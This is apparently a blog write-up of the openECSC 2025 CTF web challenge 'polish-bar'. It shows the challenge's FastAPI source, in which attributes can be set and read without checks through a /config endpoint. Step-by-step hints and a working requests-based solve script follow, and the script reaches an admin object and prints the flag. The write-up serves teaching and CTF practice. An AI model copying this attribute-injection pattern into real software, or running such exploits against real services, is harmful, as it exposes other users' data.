---
title: "openESEC 2025 - web/polish-bar"
layout: single
classes: wide
date: 2025-10-06
categories: blog
---

> This Web Application was made to adapt to polish (drinking) culture :3

# Setup

We have a frontend serving some `Jinja` templates that has some HTTP endpoints we can use to ~~get hella drunk~~ understand what the polish bar has to offer. All endpoint endpoints somewhat modify the `BeverageConfig` of our account. There is an admin account that has the flag:

```py
app = FastAPI()
templates = Jinja2Templates(directory="templates")
sessions = {}

def admin_session_setup():
    session_id = str(uuid.uuid4())

    sessions[session_id] = {
        'username': 'admin',
        'password': str(os.urandom(10).hex()),
        'config': BeverageConfig(os.getenv('FLAG', 'openECSC{TEST_FLAG}'))
    }

admin_session_setup()


@app.get("/")
...

@app.get("/register")
...

@app.post("/register")
async def post_register(request: Request, username: str = Form(...), password: str = Form(...)):

    new_session_id = str(uuid.uuid4())

    sessions[new_session_id] = { 'username': username, 'password': password, 'config': BeverageConfig(None) }

    response = RedirectResponse(url="/profile", status_code=303)
    response.set_cookie(key="session", value=new_session_id, HTTPonly=True)
    return response


@app.get("/profile")
async def get_profile(request: Request):

    session_id = request.cookies.get('session')

    if session_id in sessions:
        return templates.TemplateResponse("profile.html", {
            "request": request, 
            "username": sessions[session_id]['username'],
            "config": sessions[session_id]['config'].get_config()
        })

    return RedirectResponse(url="/register", status_code=303)


@app.post("/config")
async def update_config(request: Request, config: str = Form(...), value: str = Form(...)):

    session_id = request.cookies.get('session')

    if session_id in sessions:
        err = sessions[session_id]['config'].update_property(config, value)

        return templates.TemplateResponse("profile.html", {
            "request": request, 
            "username": sessions[session_id]['username'],
            "config": sessions[session_id]['config'].get_config(),
            "error": 'Beverage is not in your shelf!' if err else ''
        })

    return RedirectResponse(url="/register", status_code=303)


@app.post("/beverage")
async def update_config(request: Request, beverage: str = Form(...)):

    session_id = request.cookies.get('session')

    if session_id in sessions:
        sessions[session_id]['config'].add_beverage(beverage)

        return templates.TemplateResponse("profile.html", {
            "request": request, 
            "username": sessions[session_id]['username'],
            "config": sessions[session_id]['config'].get_config()
        })

    return RedirectResponse(url="/register", status_code=303)


@app.post("/empty")
async def update_config(request: Request):

    session_id = request.cookies.get('session')

    if session_id in sessions:
        sessions[session_id]['config'].empty_alcohol_shelf()

        return templates.TemplateResponse("profile.html", {
            "request": request, 
            "username": sessions[session_id]['username'],
            "config": sessions[session_id]['config'].get_config()
        })

    return RedirectResponse(url="/register", status_code=303)
```

The HTTP endpoint to `register` is pretty important to obtain a session. Afterwards, we have the endpoints `config`,`empty` and `beverage` which I mapped to the methods below in the class `BeverageConfig` and `PreferenceConfig`. Look at the jupyter notebook in [the playground](#python-refresher-and-playground) to see the classes `BeverageConfig` etc. 

```py
    def get_property(self, val):
        try:
            if hasattr(self.alcohol_shelf, val):
                return getattr(self.alcohol_shelf, val)

            return getattr(self, val)
        except:
            return

    # /config
    def update_property(self, key: str, val: str):
        attr = self.get_property(val)
        if attr:
            setattr(self, key, attr)
            return
        return { 'error': 'property doesn\'t exist!' }
    
    # /empty
    def empty_alcohol_shelf(self):
        if hasattr(self.alcohol_shelf, "_alcohol_shelf"):
            self.alcohol_shelf._alcohol_shelf = [self.alcohol_shelf._alcohol_shelf[0]]
        else:
            self.alcohol_shelf = self.alcohol_shelf[0]

    # /beverage
    def add_beverage(self, beverage: str):
        self.alcohol_shelf._alcohol_shelf.append(beverage)

```

Let's disect what each method does:

- `update_property` retrieves the attribute `val` and sets the attribute `key` to its value
- `empty_alcohol_shelf` will shorten the list `self.alcohol_shelf._alcohol_shelf` to its first value. If they does not exists, it will reduce the list `self.alcohol_shelf` to its first value.
- `add_beverage` adds an item to the list `self.alcohol_shelf._alcohol_shelf`.

If you are not familiar with the special methods `getattr`, `setattr` and `hasattr` --- I got you covered in the next section!

## Python refresher and playground

Below is a small playground I created if you want to try it on your own first. At the end, I included the challenge classes such that you can play around to try to solve this ctf on your own. You can use the [hints](#intuition).

<iframe
  src="https://bluuuk.github.io/blog-jupyterlite/lab/index.html?path=/openECSC-playground.ipynb"
  id="jupyterlite"
  width="100%"
  height="1000px"
  tabindex="-1">
</iframe>

<script>
const origScrollTo = window.scrollTo;

window.scrollTo = function(x, y) {
  // Optionally, we can filter / deny certain calls,
  // e.g. if y isn't zero, or only allow calls from certain contexts.
  // For now, do nothing (suppress)
};

// After iframe has loaded (or after appropriate delay), restore it:
iframe.addEventListener("load", () => {
  setTimeout(() => {
    window.scrollTo = origScrollTo;
  }, 200);
});
</script>

## Intuition

Below, I collected my first sight intuitions. Do not scroll to far, otherwise you will see the solution. Click as you like:

{% capture hint1 %}
Overall, the class `PreferenceConfig` and thus `BeverageConfig` due to inheritance have one interesting class variable `_all_instances`. The `__init__` for `PreferenceConfig` appends every newly created object to that class as long it is inherited from `PreferenceConfig`.
{% endcapture %}

<details>
  <summary>Hint 1)</summary>
  {{ hint1 | markdownify }}
</details>

{% capture hint2 %}
The first element of `_all_instances` is always **admin** `BeverageConfig`. Therefore, if we register to create our own session, our object will be `_all_instances[1]`.
{% endcapture %}

<details>
  <summary>Hint 2)</summary>
  {{ hint2 | markdownify }}
</details>

{% capture hint3 %}
We can use `/config` to essentially do `setattr(self,"{key}",get_property(self,"{value}"))` where we control `{key}` and `{value}`.
{% endcapture %}

<details>
  <summary>Hint 3)</summary>
  {{ hint3 | markdownify }}
</details>

{% capture hint4 %}
With Hint $4$ in mind, we set `alcohol_shelf` to `_all_instances`. Now, `alcohol_shelf` is not of type `AlcoholShelf` anymore — it's merely just a list.
{% endcapture %}

<details>
  <summary>Hint 4)</summary>
  {{ hint4 | markdownify }}
</details>

{% capture hint5 %}
We can use `/empty` to convert the list `alcohol_shelf = [admin, us]` to `alcohol_shelf = admin`.
{% endcapture %}

<details>
  <summary>Hint 5)</summary>
  {{ hint5 | markdownify }}
</details>

{% capture hint6 %}
We can use `/profile` to obtain our `alcohol_shelf` via `get_beverages` of our object. This just returns `self.alcohol_shelf` which has the value of `_all_instances[0]`, aka the flag.
{% endcapture %}

<details>
  <summary>Hint 6)</summary>
  {{ hint6 | markdownify }}
</details>

## Step by step guide

This section includey the final solution and a step by step visualization with [python tutor](HTTPs://pythontutor.com/python-compiler.html#). Feel free to go there and play with the tool

The final solve is therefore:

```py
Solve = BeverageConfig(None)
Solve.update_property(
    "alcohol_shelf","_all_instances"
)
Solve.empty_alcohol_shelf()
Solve.get_config()
```

### Create our own `BeverageConfig`

![Step 1](/assets/images/2025-10-06-openESEC-web-polish-bar/step1.png)

### Update the `alcohol_shelf` attribute

![Step 2](/assets/images/2025-10-06-openESEC-web-polish-bar/step2.png)

### Use empty to shorten list to its first argument

![Step 3](/assets/images/2025-10-06-openESEC-web-polish-bar/step3.png)

### Calling `get_config`

The green arrow shows the last executed line whereas the red arrow is for the current one. 

![Step 4](/assets/images/2025-10-06-openESEC-web-polish-bar/step4.png)

### `self.get_property('preferred_beverage')` points to the flag

![Step 5](/assets/images/2025-10-06-openESEC-web-polish-bar/step5.png)

## Final Solve

We use an `Session` which automatically glues the cookie to subsequent HTTP requests once set.

```py
import requests
session = requests.Session()
base = "https://3a454160-13f7-4fdc-beaf-ea41d11839cb.openec.sc:1337"

session.post( f"{base}/register", data={"username":"admin","password":"lol"})
session.post(f"{base}/config",data={"config":"alcohol_shelf","value":"_all_instances"})
session.post(f"{base}/empty")
print(session.post(f"{base}/profile"))
```

Executing our solve script gives us our well deserved flag :)

```bash
❯ python solve.py | grep open
                    openECSC{gggrrrrrrr_ppyytthhonnn_8c719052fa04}
                               value="openECSC{gggrrrrrrr_ppyytthhonnn_8c719052fa04}">
````
